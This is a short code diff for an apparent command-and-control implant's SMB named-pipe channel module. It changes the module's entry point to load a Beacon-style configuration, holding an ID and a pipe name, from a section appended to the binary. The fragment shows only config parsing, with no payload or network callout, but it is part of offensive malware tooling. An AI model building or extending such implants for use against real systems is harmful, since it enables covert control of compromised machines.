@@ -80,16 +80,22 @@ BOOL SmbCleanup( CHANNEL_CONTEXT* Context ) {
     return TRUE;
 }
 
-BOOL go( IImplant* Implant, IChannel* Channel, PVOID Config, DWORD ConfigSize ) {
+char __CONFIG__[0] __attribute__((section("config")));
+char * findAppendedConfig() {
+    return (char *)&__CONFIG__;
+}
+
+BOOL go( IImplant* Implant, IChannel* Channel) {
     datap            Parser;
     CHANNEL_CONTEXT* Context = NULL;
+    _RESOURCE*       Config  = (_RESOURCE *)findAppendedConfig();
 
     Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
     if (Context == NULL) {
         return FALSE;
     }
 
-    Implant->BeaconDataParse( &Parser, Config, ConfigSize );
+    Implant->BeaconDataParse( &Parser, Config->value, Config->length );
     Context->Config.ID       = Implant->BeaconDataInt( &Parser );
     Context->Config.PipeName = strdup( Implant->BeaconDataExtract( &Parser, NULL ) );
 
